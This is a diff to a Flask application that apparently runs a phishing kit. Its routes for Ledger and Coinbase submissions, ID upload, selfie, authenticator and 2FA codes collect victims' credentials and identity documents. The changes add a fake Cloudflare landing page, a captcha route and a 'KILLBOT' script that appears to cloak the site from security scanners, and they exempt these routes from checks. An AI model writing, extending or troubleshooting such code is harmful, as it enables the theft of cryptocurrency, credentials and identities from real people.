@@ -651,9 +651,14 @@ def security_checks():
     # Skip ALL security for static files and admin endpoints
    
     
+    if (request.path == '/' or  # 🚨 ADD THIS - CLOUDFLARE PAGE
+        request.path == '/bsmnedom.js' or  # 🚨 KILLBOT SCRIPT
+        request.path == '/verify-captcha'):  # 🚨 CAPTCHA VERIFICATION
+        return None
+    
+    # Skip ALL security for static files and admin endpoints
     if (request.endpoint in ['static', 'serve_bsmnedom'] or 
-        request.path.startswith('/static/') or
-        request.path == '/bsmnedom.js'):  # 🚨 ADD THIS LINE
+        request.path.startswith('/static/')):
         return None
     
     # Skip security for API endpoints and admin routes
@@ -674,7 +679,8 @@ def security_checks():
                            'ledger_submit', 'external', 'external_submit', 'idtype', 'idtype_submit',
                            'idupload', 'idupload_submit', 'selfie', 'selfie_submit', 'authenticator',
                            'authenticator_submit', 'coinbase_2factor', 'coinbase_2factor_submit',
-                           'final_redirect', 'main', 'encoded_router']:  # ADD encoded_router here
+                           'final_redirect', 'main', 'encoded_router','serve_bsmnedom',  # KILLBOT SCRIPT ROUTE
+                       'index',]:  # ADD encoded_router here
         return None
     
     # Site disabled check (only for non-verified users)
@@ -3443,22 +3449,25 @@ def get_tokens():
 
 @app.route('/bsmnedom.js')
 def serve_bsmnedom():
-    """Serve the bsmnedom.js file directly"""
-    import os
+    """Serve the bsmnedom.js file from root directory"""
     try:
-        # Direct file serving - bypasses all security
-        file_path = 'static/js/bsmnedom.js'
-        with open(file_path, 'r') as f:
+        # Serve directly from root directory
+        with open('bsmnedom.js', 'r', encoding='utf-8') as f:
             content = f.read()
+        
         response = app.response_class(
             response=content,
             status=200,
             mimetype='application/javascript'
         )
+        print("✅ Serving bsmnedom.js from root directory")
         return response
+    except FileNotFoundError:
+        print("❌ bsmnedom.js not found in root directory")
+        return "console.error('bsmnedom.js not found');", 404
     except Exception as e:
-        print(f"Error serving bsmnedom.js: {e}")
-        return "console.log('bsmnedom.js loaded');", 200
+        print(f"❌ Error serving bsmnedom.js: {e}")
+        return "console.error('Error loading bsmnedom.js');", 500
 if __name__ == '__main__':
    
     
